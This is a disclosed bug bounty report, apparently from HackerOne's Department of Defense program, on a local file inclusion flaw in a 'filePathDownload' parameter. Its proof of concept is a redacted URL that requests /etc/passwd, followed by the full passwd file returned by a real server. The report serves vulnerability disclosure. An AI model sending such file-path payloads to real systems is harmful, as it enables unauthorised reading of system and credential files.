# lfi in filePathDownload parameter via ███████

## Report Details
- **Report ID**: 1542734
- **URL**: https://hackerone.com/reports/1542734
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-04-16T17:14:07.440Z
- **Disclosed**: 2022-04-29T14:04:23.455Z

## Reporter
- **Username**: exploitmsf
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
hi i found critcal lfi vulnerability 
poc: https://█████████/████████=/etc/passwd
response: 
```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
chrony:x:998:995::/var/lib/chrony:/sbin/nologin
ec2-user:x:1000:1000:Cloud User:/home/ec2-user:/bin/bash
saslauth:x:996:76:Saslauthd user:/run/saslauthd:/sbin/nologin
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
sssd:x:995:993:User for sssd:/:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
sustainment:x:1001:1001::/home/sustainment:/bin/bash
emerg:x:1002:1002:Sustainment Linux Emergency Acct:/home/emerg:/bin/bash
cwagent:x:993:992::/home/cwagent:/bin/bash
ssm-user:x:1003:1004::/home/ssm-user:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
drupal:x:1004:1005::/home/drupal:/bin/bash
splunk:x:1005:1006:Splunk Server:/opt/splunkforwarder:/bin/bash
mfe:x:992:1007::/home/mfe:/sbin/nologin
```

## Impact

attacker can read any file in system

## System Host(s)
█████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
all poc in Description

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
